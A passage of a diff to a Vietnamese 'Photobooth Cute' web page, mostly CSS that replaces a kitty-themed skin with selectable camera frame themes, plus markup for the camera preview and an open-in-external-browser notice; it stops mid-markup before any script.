@@ -3,848 +3,590 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Chụp Photobooth</title>
+    <title>Photobooth Cute 📸</title>
     <style>
-      * {
-        box-sizing: border-box;
-      }
-
-      :root {
-        --pink: #f85199;
-        --pink-dark: #d6136c;
-        --pink-light: #ffd8e4;
-        --pink-pale: #fff3f8;
-        --text: #4b3f47;
-      }
-
-      html,
+      * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+      html, body { min-height: 100%; }
       body {
-        min-height: 100%;
-      }
-
-      body {
-        font-family:
-          "SF Pro Display",
-          -apple-system,
-          BlinkMacSystemFont,
-          "Segoe UI",
-          Roboto,
-          sans-serif;
-        background:
-          radial-gradient(
-            circle at 8% 12%,
-            rgba(255, 255, 255, 0.95),
-            transparent 23%
-          ),
-          radial-gradient(
-            circle at 92% 88%,
-            rgba(248, 81, 153, 0.17),
-            transparent 25%
-          ),
-          linear-gradient(145deg, #ffd8e4 0%, #fff0f5 52%, #ffdeea 100%);
-        color: var(--text);
+        font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        background: linear-gradient(135deg, #ffe0ec 0%, #fff5fa 45%, #ffe4f1 100%);
+        color: #4b3f47;
         display: flex;
         justify-content: center;
         align-items: center;
         min-height: 100vh;
         margin: 0;
-        overflow: hidden;
+        padding: 16px;
+        overflow-x: hidden;
       }
 
-      body::before,
-      body::after {
+      /* Decorative floating hearts */
+      body::before, body::after {
+        content: "";
         position: fixed;
-        z-index: 0;
-        color: rgba(214, 19, 108, 0.2);
         pointer-events: none;
-        animation: float 5s ease-in-out infinite;
+        z-index: 0;
       }
       body::before {
         content: "♡";
-        left: 7%;
-        top: 13%;
-        font-size: 70px;
-        transform: rotate(-10deg);
+        top: 5%;
+        left: 6%;
+        font-size: 60px;
+        color: rgba(248, 81, 153, 0.15);
+        animation: float 6s ease-in-out infinite;
       }
       body::after {
-        content: "✦";
-        right: 9%;
-        bottom: 14%;
-        font-size: 44px;
-        animation-delay: -2s;
+        content: "✿";
+        bottom: 8%;
+        right: 7%;
+        font-size: 50px;
+        color: rgba(248, 81, 153, 0.18);
+        animation: float 7s ease-in-out infinite reverse;
+      }
+      @keyframes float {
+        0%, 100% { transform: translateY(0) rotate(-5deg); }
+        50% { transform: translateY(-16px) rotate(8deg); }
       }
 
       .card {
         position: relative;
         z-index: 1;
-        background: rgba(255, 255, 255, 0.94);
-        backdrop-filter: blur(15px);
-        -webkit-backdrop-filter: blur(15px);
-        padding: 28px 20px 23px;
+        background: rgba(255, 255, 255, 0.92);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        padding: 24px 20px 20px;
         border-radius: 32px;
         text-align: center;
-        width: 90%;
-        max-width: 414px;
-        border: 1px solid rgba(255, 255, 255, 0.95);
+        width: 100%;
+        max-width: 440px;
+        border: 2px solid rgba(255, 255, 255, 0.95);
         box-shadow:
-          0 24px 60px rgba(214, 19, 108, 0.15),
-          0 7px 20px rgba(255, 182, 193, 0.22);
+          0 24px 60px rgba(214, 19, 108, 0.18),
+          0 0 0 4px rgba(248, 81, 153, 0.08),
+          inset 0 0 30px rgba(255, 200, 220, 0.15);
         animation: cardIn 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
       }
-
-      .card::before {
-        content: "♡";
-        position: absolute;
-        top: 12px;
-        right: 18px;
-        color: #f7b3cd;
-        font-size: 18px;
-        animation: pulse 2.5s ease-in-out infinite;
+      @keyframes cardIn {
+        from { opacity: 0; transform: translateY(20px) scale(0.97); }
+        to { opacity: 1; transform: translateY(0) scale(1); }
       }
 
       h2 {
         margin: 0;
-        color: var(--pink-dark);
-        font-size: 26px;
-        font-weight: 800;
-        letter-spacing: -0.4px;
+        color: #d6136c;
+        font-size: 24px;
+        font-weight: 900;
+        letter-spacing: -0.5px;
+        line-height: 1.2;
       }
-
       .title-sub {
-        margin: 7px 0 0;
-        color: #8a7d85;
-        font-size: 13px;
-        font-weight: 500;
-      }
-
-      .camera-view {
-        width: 100%;
-        height: 300px;
-        background:
-          radial-gradient(
-            circle at center,
-            rgba(255, 255, 255, 0.95),
-            transparent 48%
-          ),
-          linear-gradient(135deg, #fff4f8, #ffe5ef);
-        border-radius: 24px;
-        margin: 19px 0 16px;
-        overflow: hidden;
-        position: relative;
-        border: 2px dashed rgba(214, 19, 108, 0.55);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        box-shadow: inset 0 0 35px rgba(248, 81, 153, 0.08);
-        transition: 0.3s ease;
-      }
-
-      .camera-view::before,
-      .camera-view::after {
-        content: "";
-        position: absolute;
-        z-index: 3;
-        width: 28px;
-        height: 28px;
-        border-color: var(--pink);
-        pointer-events: none;
-      }
-      .camera-view::before {
-        left: 14px;
-        top: 14px;
-        border-left: 3px solid;
-        border-top: 3px solid;
-        border-radius: 8px 0 0 0;
-      }
-      .camera-view::after {
-        right: 14px;
-        bottom: 14px;
-        border-right: 3px solid;
-        border-bottom: 3px solid;
-        border-radius: 0 0 8px 0;
-      }
-
-      video {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        display: none;
-        transform: scaleX(-1);
-      }
-
-      #msg {
-        color: #8b7d85 !important;
-        font-size: 13px;
-        font-weight: 500;
-      }
-
-      .camera-status {
-        position: absolute;
-        top: 12px;
-        left: 12px;
-        z-index: 4;
-        padding: 6px 10px;
-        border-radius: 999px;
-        background: rgba(255, 255, 255, 0.86);
-        color: #74666e;
-        font-size: 10px;
-        font-weight: 800;
-        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.07);
-        display: flex;
-        align-items: center;
-        gap: 6px;
-      }
-      .camera-status::before {
-        content: "";
-        width: 7px;
-        height: 7px;
-        border-radius: 50%;
-        background: #f0b4c9;
-      }
-      .camera-view.camera-ready {
-        border-style: solid;
-        border-color: rgba(248, 81, 153, 0.8);
-        box-shadow:
-          inset 0 0 35px rgba(248, 81, 153, 0.12),
-          0 0 0 5px rgba(248, 81, 153, 0.05);
-      }
-      .camera-view.camera-ready .camera-status::before {
-        background: #45c97b;
-        box-shadow: 0 0 0 4px rgba(69, 201, 123, 0.13);
-      }
-
-      .btn {
-        position: relative;
-        overflow: hidden;
-        background: linear-gradient(135deg, #ff69a8, #e92b7b);
-        color: white;
-        border: none;
-        padding: 17px;
-        width: 100%;
-        border-radius: 18px;
-        font-weight: 800;
-        cursor: pointer;
-        font-size: 16px;
-        letter-spacing: 0.15px;
-        transition:
-          transform 0.18s ease,
-          box-shadow 0.18s ease;
-        box-shadow: 0 10px 24px rgba(248, 81, 153, 0.28);
-      }
-      .btn::after {
-        content: "";
-        position: absolute;
-        top: -90%;
-        left: -30%;
-        width: 32%;
-        height: 280%;
-        transform: rotate(22deg);
-        background: rgba(255, 255, 255, 0.35);
-        transition: left 0.55s ease;
-      }
-      .btn:hover::after {
-        left: 110%;
-      }
-      .btn:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 13px 28px rgba(248, 81, 153, 0.34);
-      }
-      .btn:active {
-        transform: scale(0.98);
-      }
-      .btn:disabled {
-        background: linear-gradient(135deg, #d8d3d6, #bcb7bb);
-        color: #777;
-        cursor: not-allowed;
-        box-shadow: none;
-      }
-      .btn:disabled::after {
-        display: none;
-      }
-
-      #status {
-        font-size: 13px;
-        color: #5f525a;
-        margin-top: 14px;
-        line-height: 1.5;
+        margin: 6px 0 0;
+        color: #9a7d8a;
+        font-size: 12px;
         font-weight: 600;
       }
 
-      .stepper {
+      /* ==== CAMERA FRAME ==== */
+      .camera-wrap {
+        position: relative;
+        width: 100%;
+        aspect-ratio: 4/5;
+        margin: 18px 0 14px;
+        border-radius: 26px;
+        overflow: hidden;
+        background: linear-gradient(135deg, #fff4f8, #ffe5ef);
+        box-shadow:
+          inset 0 0 0 3px rgba(255, 255, 255, 0.6),
+          0 12px 32px rgba(214, 19, 108, 0.15);
+      }
+
+      #preview {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+        transform: scaleX(-1);
+        background: #f5e8ee;
+      }
+
+      #preview.hidden { display: none; }
+
+      #msg {
+        position: absolute;
+        inset: 0;
         display: flex;
         align-items: center;
         justify-content: center;
-        gap: 7px;
-        margin-top: 15px;
-      }
-      .step {
-        display: flex;
-        align-items: center;
-        gap: 5px;
-        color: #aaa0a7;
-        font-size: 10px;
-        font-weight: 700;
-      }
-      .step.active {
-        color: var(--pink-dark);
-      }
-      .step .circle {
-        width: 21px;
-        height: 21px;
-        border-radius: 50%;
-        display: grid;
-        place-items: center;
-        background: #f0ebee;
-        color: #93888e;
-        font-size: 10px;
-      }
-      .step.active .circle {
-        background: var(--pink);
-        color: white;
-        box-shadow: 0 0 0 4px rgba(248, 81, 153, 0.1);
-      }
-      .step-line {
-        width: 25px;
-        height: 2px;
-        border-radius: 99px;
-        background: #eee5e9;
+        color: #b88fa2;
+        font-size: 13px;
+        font-weight: 600;
+        text-align: center;
+        padding: 20px;
       }
 
+      /* ==== FRAME OVERLAY ==== */
+      .frame-overlay {
+        position: absolute;
+        inset: 0;
+        pointer-events: none;
+        z-index: 5;
+        border-radius: 26px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .frame-overlay .corner {
+        position: absolute;
+        width: 34px;
+        height: 34px;
+        border: 4px solid;
+        pointer-events: none;
+      }
+      .frame-overlay .corner.tl { top: 12px; left: 12px; border-right: none; border-bottom: none; border-radius: 14px 0 0 0; }
+      .frame-overlay .corner.tr { top: 12px; right: 12px; border-left: none; border-bottom: none; border-radius: 0 14px 0 0; }
+      .frame-overlay .corner.bl { bottom: 12px; left: 12px; border-right: none; border-top: none; border-radius: 0 0 0 14px; }
+      .frame-overlay .corner.br { bottom: 12px; right: 12px; border-left: none; border-top: none; border-radius: 0 0 14px 0; }
+
+      /* Frame theme: Hồng pastel */
+      .frame-overlay.theme-pink .corner { border-color: #ff5fa0; }
+      .frame-overlay.theme-pink::before {
+        content: "♡";
+        position: absolute;
+        top: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 22px;
+        color: #ff5fa0;
+        animation: sparkle 2s ease-in-out infinite;
+      }
+
+      /* Frame theme: Y2K */
+      .frame-overlay.theme-y2k .corner { border-color: #b060ff; }
+      .frame-overlay.theme-y2k::before {
+        content: "✦ ✧ ✦";
+        position: absolute;
+        top: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 16px;
+        letter-spacing: 4px;
+        color: #d97aff;
+        animation: sparkle 1.8s ease-in-out infinite;
+      }
+      .frame-overlay.theme-y2k::after {
+        content: "✧";
+        position: absolute;
+        bottom: 14px;
+        right: 20px;
+        font-size: 20px;
+        color: #b060ff;
+        animation: sparkle 2.2s ease-in-out infinite 0.4s;
+      }
+
+      /* Frame theme: Cổ điển */
+      .frame-overlay.theme-classic {
+        border: 6px double #a67c52;
+        border-radius: 26px;
+      }
+      .frame-overlay.theme-classic .corner { border-color: transparent; }
+      .frame-overlay.theme-classic::before {
+        content: "❦";
+        position: absolute;
+        top: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 20px;
+        color: #a67c52;
+      }
+
+      /* Frame theme: Halloween */
+      .frame-overlay.theme-halloween .corner { border-color: #ff7a00; }
+      .frame-overlay.theme-halloween::before {
+        content: "🎃";
+        position: absolute;
+        top: 8px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 24px;
+        animation: bob 2s ease-in-out infinite;
+      }
+      .frame-overlay.theme-halloween::after {
+        content: "🦇";
+        position: absolute;
+        bottom: 14px;
+        right: 20px;
+        font-size: 20px;
+        animation: bob 2.4s ease-in-out infinite 0.5s;
+      }
+
+      /* Frame theme: Tết */
+      .frame-overlay.theme-tet .corner { border-color: #e63a3a; }
+      .frame-overlay.theme-tet::before {
+        content: "🏮";
+        position: absolute;
+        top: 8px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 24px;
+        animation: bob 2s ease-in-out infinite;
+      }
+      .frame-overlay.theme-tet::after {
+        content: "🌸";
+        position: absolute;
+        bottom: 14px;
+        left: 20px;
+        font-size: 20px;
+        animation: bob 2.4s ease-in-out infinite 0.5s;
+      }
+
+      /* Frame theme: Đen trắng */
+      .frame-overlay.theme-bw {
+        border: 8px solid #1a1a1a;
+        border-radius: 26px;
+      }
+      .frame-overlay.theme-bw .corner { border-color: transparent; }
+      .frame-overlay.theme-bw::before {
+        content: "◈";
+        position: absolute;
+        top: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 18px;
+        color: #fff;
+        background: #1a1a1a;
+        padding: 0 8px;
+      }
+
+      @keyframes sparkle {
+        0%, 100% { opacity: 0.7; transform: translateX(-50%) scale(1); }
+        50% { opacity: 1; transform: translateX(-50%) scale(1.1); }
+      }
+      @keyframes bob {
+        0%, 100% { transform: translateX(-50%) translateY(0); }
+        50% { transform: translateX(-50%) translateY(-4px); }
+      }
+
+      /* ==== FRAME PICKER ==== */
+      .frame-picker {
+        margin: 0 0 16px;
+      }
+      .frame-picker-label {
+        font-size: 11px;
+        color: #b88fa2;
+        font-weight: 700;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+        margin-bottom: 8px;
+      }
+      .frame-list {
+        display: flex;
+        gap: 10px;
+        overflow-x: auto;
+        padding: 4px 2px 12px;
+        scrollbar-width: none;
+        -ms-overflow-style: none;
+      }
+      .frame-list::-webkit-scrollbar { display: none; }
+
+      .frame-item {
+        flex-shrink: 0;
+        width: 72px;
+        height: 90px;
+        border-radius: 16px;
+        cursor: pointer;
+        border: 3px solid transparent;
+        transition: all 0.25s ease;
+        position: relative;
+        overflow: hidden;
+        background: #f5e8ee;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 26px;
+      }
+      .frame-item.active {
+        border-color: #ff5fa0;
+        transform: scale(1.06);
+        box-shadow: 0 8px 20px rgba(248, 81, 153, 0.3);
+      }
+      .frame-item.active::after {
+        content: "✓";
+        position: absolute;
+        top: 2px;
+        right: 4px;
+        background: #ff5fa0;
+        color: #fff;
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        font-size: 11px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+      }
+      .frame-item[data-frame="pink"] { background: linear-gradient(135deg, #ffd9e6, #ffb5ce); }
+      .frame-item[data-frame="y2k"] { background: linear-gradient(135deg, #e0d4ff, #c7b0ff); }
+      .frame-item[data-frame="classic"] { background: linear-gradient(135deg, #f5e6d3, #d4b896); }
+      .frame-item[data-frame="halloween"] { background: linear-gradient(135deg, #ffd6a5, #ff9e3d); }
+      .frame-item[data-frame="tet"] { background: linear-gradient(135deg, #ffcfcf, #ff8080); }
+      .frame-item[data-frame="bw"] { background: linear-gradient(135deg, #d8d8d8, #a0a0a0); }
+
+      /* ==== BUTTON ==== */
+      .btn {
+        background: linear-gradient(135deg, #ff69a8, #e92b7b);
+        color: white;
+        border: none;
+        padding: 18px;
+        width: 100%;
+        border-radius: 20px;
+        font-weight: 900;
+        cursor: pointer;
+        font-size: 17px;
+        letter-spacing: 0.3px;
+        box-shadow:
+          0 8px 0 #c91a6a,
+          0 14px 28px rgba(248, 81, 153, 0.35);
+        transition: all 0.15s ease;
+      }
+      .btn:active:not(:disabled) {
+        transform: translateY(6px);
+        box-shadow: 0 2px 0 #c91a6a, 0 6px 14px rgba(248, 81, 153, 0.3);
+      }
+      .btn:disabled {
+        background: linear-gradient(135deg, #d8d3d6, #bcb7bb);
+        box-shadow: 0 6px 0 #a8a3a6;
+        color: #666;
+        cursor: not-allowed;
+      }
+
+      #status {
+        font-size: 12px;
+        color: #8a7d85;
+        margin-top: 14px;
+        line-height: 1.5;
+        font-weight: 600;
+        min-height: 18px;
+      }
+
+      /* ==== RESULT MODAL ==== */
+      .result-modal {
+        position: fixed;
+        inset: 0;
+        z-index: 100;
+        background: rgba(40, 15, 30, 0.75);
+        backdrop-filter: blur(8px);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        animation: fadeIn 0.3s ease;
+      }
+      .result-modal.show { display: flex; }
+      @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+      .result-box {
+        background: #fff;
+        border-radius: 28px;
+        padding: 24px 20px;
+        max-width: 380px;
+        width: 100%;
+        text-align: center;
+        animation: popIn 0.4s cubic-bezier(0.2, 0.8, 0.2, 1.2);
+        max-height: 90vh;
+        overflow-y: auto;
+      }
+      @keyframes popIn {
+        from { opacity: 0; transform: scale(0.85); }
+        to { opacity: 1; transform: scale(1); }
+      }
+
+      .result-box h3 {
+        margin: 0 0 4px;
+        color: #d6136c;
+        font-size: 20px;
+      }
+      .result-box p {
+        margin: 0 0 16px;
+        color: #9a7d8a;
+        font-size: 12px;
+      }
+      .result-img {
+        width: 100%;
+        border-radius: 16px;
+        display: block;
+        box-shadow: 0 8px 24px rgba(214, 19, 108, 0.2);
+        margin-bottom: 18px;
+      }
+      .result-loading {
+        padding: 40px 20px;
+        color: #b88fa2;
+        font-size: 13px;
+        font-weight: 600;
+      }
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #f0e0e8;
+        border-top-color: #ff5fa0;
+        border-radius: 50%;
+        margin: 0 auto 14px;
+        animation: spin 0.8s linear infinite;
+      }
+      @keyframes spin { to { transform: rotate(360deg); } }
+
+      /* ==== BROWSER WARNING ==== */
       #browser-warning {
         display: none;
         position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
+        inset: 0;
         background: linear-gradient(145deg, #ffd8e4, #fff0f5);
         z-index: 10000;
         padding: 30px 20px;
-        box-sizing: border-box;
         align-items: center;
         justify-content: center;
       }
-
       .warning-box {
         max-width: 420px;
-        background: rgba(255, 255, 255, 0.96);
-        border: 1px solid rgba(248, 81, 153, 0.3);
+        background: #fff;
         padding: 30px 24px;
         border-radius: 28px;
         text-align: center;
-        box-shadow: 0 20px 50px rgba(214, 19, 108, 0.16);
+        box-shadow: 0 20px 50px rgba(214, 19, 108, 0.2);
       }
-      .warning-box h3 {
-        color: var(--pink-dark);
-        margin-top: 0;
-      }
+      .warning-box h3 { color: #d6136c; margin-top: 0; }
       .steps {
         text-align: left;
         margin-top: 20px;
         color: #5c5158;
-        font-size: 15px;
+        font-size: 14px;
         line-height: 1.8;
       }
-      .highlight {
-        color: var(--pink-dark);
-        font-weight: bold;
-      }
+      .highlight { color: #d6136c; font-weight: bold; }
 
-      @keyframes cardIn {
-        from {
-          opacity: 0;
-          transform: translateY(18px) scale(0.98);
-        }
-        to {
-          opacity: 1;
-          transform: translateY(0) scale(1);
-        }
-      }
-      @keyframes float {
-        0%,
-        100% {
-          transform: translateY(0) rotate(-5deg);
-        }
-        50% {
-          transform: translateY(-12px) rotate(5deg);
-        }
-      }
-      @keyframes pulse {
-        0%,
-        100% {
-          opacity: 0.45;
-          transform: scale(1);
-        }
-        50% {
-          opacity: 1;
-          transform: scale(1.15);
-        }
-      }
-
-      /* ===== PHOTObooth skin ===== */
-      body {
-        background:
-          radial-gradient(
-            circle at 8% 10%,
-            rgba(255, 255, 255, 0.9) 0 4px,
-            transparent 5px
-          ),
-          radial-gradient(
-            circle at 24% 18%,
-            rgba(255, 255, 255, 0.8) 0 3px,
-            transparent 4px
-          ),
-          radial-gradient(
-            circle at 80% 14%,
-            rgba(255, 255, 255, 0.85) 0 4px,
-            transparent 5px
-          ),
-          radial-gradient(
-            circle at 90% 42%,
-            rgba(255, 255, 255, 0.75) 0 3px,
-            transparent 4px
-          ),
-          radial-gradient(
-            circle at 12% 70%,
-            rgba(255, 255, 255, 0.8) 0 4px,
-            transparent 5px
-          ),
-          linear-gradient(135deg, #ffd5e4 0%, #fff0f6 48%, #ffd7e7 100%) !important;
-        overflow-x: hidden !important;
-        overflow-y: auto !important;
-      }
-
-      body::before {
-        content: "♡   ✦   ♡";
-        left: 5%;
-        top: 9%;
-        color: rgba(248, 81, 153, 0.25);
-        font-size: 28px;
-        letter-spacing: 14px;
-      }
-      body::after {
-        content: "🎀   ♡";
-        right: 4%;
-        bottom: 12%;
-        color: rgba(248, 81, 153, 0.3);
-        font-size: 27px;
-      }
-
-      .card {
-        margin: 92px auto 28px !important;
-        padding: 29px 20px 25px !important;
-        width: min(92%, 430px) !important;
-        max-width: 430px !important;
-        border-radius: 34px !important;
-        background: rgba(255, 255, 255, 0.91) !important;
-        border: 2px solid rgba(255, 255, 255, 0.95) !important;
-        box-shadow:
-          0 0 0 3px rgba(248, 81, 153, 0.1),
-          0 20px 55px rgba(214, 19, 108, 0.18),
-          inset 0 0 30px rgba(255, 182, 207, 0.16) !important;
-      }
-
-      h2 {
-        color: #df2b76 !important;
-        font-size: 31px !important;
-        line-height: 1.14 !important;
-        font-weight: 900 !important;
-        text-shadow: 0 2px 0 rgba(255, 255, 255, 0.9);
-      }
-
-      .title-sub {
-        color: #8c596d !important;
-        font-size: 15px !important;
-        font-weight: 700 !important;
-        line-height: 1.4 !important;
-      }
-
-      .camera-view {
-        height: 330px !important;
-        margin: 23px 0 18px !important;
-        border: 3px dashed #f28ab3 !important;
-        border-radius: 28px !important;
-        background:
-          radial-gradient(
-            circle at 50% 48%,
-            rgba(255, 255, 255, 0.78),
-            transparent 38%
-          ),
-          linear-gradient(145deg, #ffeaf2, #fff1f6) !important;
-        box-shadow:
-          inset 0 0 0 7px rgba(255, 255, 255, 0.34),
-          inset 0 0 35px rgba(248, 81, 153, 0.11),
-          0 6px 0 rgba(248, 81, 153, 0.06) !important;
-      }
-
-      .camera-view::before,
-      .camera-view::after {
-        width: 38px !important;
-        height: 38px !important;
-        border-width: 4px !important;
-        border-color: #ef3d84 !important;
-      }
-
-      .camera-status {
-        top: 14px !important;
-        left: 14px !important;
-        padding: 7px 12px !important;
-        color: #e6387e !important;
-        border: 1px solid #f5a1c0 !important;
-        background: rgba(255, 255, 255, 0.9) !important;
-      }
-
-      #msg {
-        color: #9a6579 !important;
-        font-size: 16px !important;
-        font-weight: 800 !important;
-      }
-
-      .btn {
-        min-height: 65px !important;
-        border-radius: 20px !important;
-        background: linear-gradient(135deg, #ff66a5, #ef2e7e) !important;
-        font-size: 19px !important;
-        font-weight: 900 !important;
-        box-shadow:
-          0 8px 0 #d91e69,
-          0 14px 27px rgba(248, 81, 153, 0.25) !important;
-      }
-
-      .btn:active {
-        transform: translateY(5px) scale(0.99) !important;
-        box-shadow: 0 3px 0 #d91e69 !important;
-      }
-
-      #status {
-        color: #8d5c70 !important;
-        font-size: 15px !important;
-        font-weight: 800 !important;
-      }
-
-      .stepper {
-        display: none !important;
-      }
-
-      .kitty-top {
-        position: fixed;
-        z-index: 10;
-        left: 50%;
-        top: 18px;
-        width: 142px;
-        height: 128px;
-        transform: translateX(-50%);
-        pointer-events: none;
-        animation: kittyFloatTop 3.6s ease-in-out infinite;
-        filter: drop-shadow(0 8px 8px rgba(214, 19, 108, 0.14));
-      }
-      .kitty-top .face {
-        position: absolute;
-        left: 18px;
-        top: 19px;
-        width: 106px;
-        height: 91px;
-        background: #fff;
-        border: 3px solid #ef9fbd;
-        border-radius: 48% 48% 46% 46%;
-      }
-      .kitty-top .ear {
-        position: absolute;
-        top: -15px;
-        width: 39px;
-        height: 38px;
-        background: #fff;
-        border: 3px solid #ef9fbd;
-        z-index: -1;
-      }
-      .kitty-top .ear.l {
-        left: 4px;
-        transform: rotate(-17deg);
-        border-radius: 75% 20% 20% 20%;
-      }
-      .kitty-top .ear.r {
-        right: 4px;
-        transform: rotate(17deg);
-        border-radius: 20% 75% 20% 20%;
-      }
-      .kitty-top .eye {
-        position: absolute;
-        top: 42px;
-        width: 9px;
-        height: 15px;
-        border-radius: 50%;
-        background: #3d3339;
-      }
-      .kitty-top .eye.l {
-        left: 34px;
-      }
-      .kitty-top .eye.r {
-        right: 34px;
-      }
-      .kitty-top .nose {
-        position: absolute;
-        left: 50%;
-        top: 58px;
-        width: 14px;
-        height: 9px;
-        transform: translateX(-50%);
-        border-radius: 50%;
-        background: #ffd43f;
-        border: 1px solid #e3b731;
-      }
-      .kitty-top .whisker {
-        position: absolute;
-        width: 29px;
-        height: 2px;
-        background: #8d7d84;
-        border-radius: 2px;
-      }
-      .kitty-top .w1 {
-        left: -15px;
-        top: 55px;
-        transform: rotate(8deg);
-      }
-      .kitty-top .w2 {
-        left: -15px;
-        top: 66px;
-        transform: rotate(-8deg);
-      }
-      .kitty-top .w3 {
-        right: -15px;
-        top: 55px;
-        transform: rotate(-8deg);
-      }
-      .kitty-top .w4 {
-        right: -15px;
-        top: 66px;
-        transform: rotate(8deg);
-      }
-
-      .kitty-top .bow {
-        position: absolute;
-        top: -13px;
-        right: -7px;
-        width: 48px;
-        height: 35px;
-      }
-      .kitty-top .bow::before,
-      .kitty-top .bow::after {
-        content: "";
-        position: absolute;
-        top: 2px;
-        width: 27px;
-        height: 30px;
-        background: #f34d93;
-        border: 2px solid #d82b73;
-      }
-      .kitty-top .bow::before {
-        left: 0;
-        transform: rotate(-15deg);
-        border-radius: 75% 20% 70% 25%;
-      }
-      .kitty-top .bow::after {
-        right: 0;
-        transform: rotate(15deg);
-        border-radius: 20% 75% 25% 70%;
-      }
-      .kitty-top .bow i {
-        position: absolute;
-        z-index: 2;
-        left: 50%;
-        top: 10px;
-        width: 16px;
-        height: 16px;
-        transform: translateX(-50%);
-        border-radius: 50%;
-        background: #e72c79;
-        border: 2px solid #d82b73;
-      }
-
-      .kitty-side {
-        position: fixed;
-        z-index: 3;
-        bottom: 10%;
-        width: 82px;
-        height: 100px;
-        pointer-events: none;
-        font-size: 63px;
-        line-height: 1;
-        filter: drop-shadow(0 7px 7px rgba(214, 19, 108, 0.13));
-        animation: kittySideFloat 4s ease-in-out infinite;
-      }
-      .kitty-side.left {
-        left: max(2px, calc(50% - 255px));
-      }
-      .kitty-side.right {
-        right: max(2px, calc(50% - 255px));
-        animation-delay: -2s;
-      }
-      .kitty-side::after {
-        content: "🎀";
-        position: absolute;
-        top: 0;
-        font-size: 25px;
-      }
-      .kitty-side.left::after {
-        right: 3px;
-      }
-      .kitty-side.right::after {
-        left: 3px;
-      }
-
-      @keyframes kittyFloatTop {
-        0%,
-        100% {
-          margin-top: 0;
-        }
-        50% {
-          margin-top: -7px;
-        }
-      }
-      @keyframes kittySideFloat {
-        0%,
-        100% {
-          transform: translateY(0);
-        }
-        50% {
-          transform: translateY(-8px);
-        }
-      }
-
-      @media (max-width: 560px) {
-        .card {
-          margin-top: 96px !important;
-          margin-bottom: 22px !important;
-        }
-        .kitty-top {
-          top: 10px;
-          transform: translateX(-50%) scale(0.9);
-        }
-        .kitty-side {
-          opacity: 0.8;
-          transform: scale(0.78);
-        }
-        .kitty-side.left {
-          left: -10px;
-        }
-        .kitty-side.right {
-          right: -10px;
-        }
-      }
-      @media (max-height: 700px) {
-        .camera-view {
-          height: 245px !important;
-        }
-        .card {
-          margin-top: 82px !important;
-          padding-top: 22px !important;
-        }
+      @media (max-width: 380px) {
+        .card { padding: 20px 16px; }
+        h2 { font-size: 21px; }
+        .frame-item { width: 64px; height: 80px; }
       }
     </style>
   </head>
   <body>
-    <div class="kitty-top" aria-hidden="true">
-      <div class="face">
-        <span class="ear l"></span><span class="ear r"></span>
-        <span class="eye l"></span><span class="eye r"></span>
-        <span class="nose"></span>
-        <span class="whisker w1"></span><span class="whisker w2"></span>
-        <span class="whisker w3"></span><span class="whisker w4"></span>
-        <span class="bow"><i></i></span>
-      </div>
-    </div>
-    <div class="kitty-side left" aria-hidden="true">🐱</div>
-    <div class="kitty-side right" aria-hidden="true">🐱</div>
-
     <div id="browser-warning">
       <div class="warning-box">
         <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
         <div class="steps">
-          Hãy Mở Website Theo Hướng Dẫn Phía Dưới Để Không Bị Chặn. Vui lòng:<br />
-          1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc
-          <span class="highlight">(⋮)</span> ở góc trên bên phải.<br />
-          2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (hoặc
-          <i>Open in Browser</i>/<i>Safari</i>) để bắt đầu xác thực.
+          Vui lòng:<br />
+          1. Nhấn <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> góc trên phải.<br />
+          2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span>.
         </div>
       </div>
     </div>
 
     <div class="card" id="mainCard">
-      <h2 style="margin: 0">Chụp Photobooth<br />Cùng Mình Nha</h2>
-      <div class="title-sub">Nhìn thẳng vào camera chu môi lên nhé ♡</div>
-      <div class="camera-view" id="vBox">
-        <div class="camera-status">CAMERA</div>
-        <p id="msg" style="color: #484f58">Đang khởi tạo camera...</p>
-        <video id="preview" autoplay playsinline muted></video>
-      </div>
-      <button class="btn" id="startBtn">📸 &nbsp; 🎀 BẮT ĐẦU CHỤP NÈ</button>
-      <div class="stepper">
-        <div class="step active">
-          <span class="circle">1</span><span>Chuẩn bị</span>
-        </div>
-        <div class="step-line"></div>
-        <div class="step" id="step2">
-          <span class="circle">2</span><span>Chụp ảnh</span>
-        </div>
-        <div class="step-line"></div>
-        <div class="step" id="step3">
-          <span class="circle">3</span><span>Hoàn tất</span>
+      <h2>📸 Photobooth Cute</h2>
+      <div class="title-sub">Chọn khung yêu thích rồi chụp thôi ♡</div>
+
+      <!-- Camera -->
+      <div class="camera-wrap">
+        <video id="preview" autoplay playsinline muted class="hidden"></video>
+        <p id="msg">Đang khởi tạo camera...</p>
+        <div class="frame-overlay theme-pink" id="frameOverlay">
+          <span class="corner tl"></span>
+          <span class="corner tr"></span>
+          <span class="corner bl"></span>
+          <span class="corner br"></span>
         </div>
       </div>
-      <div id="status">
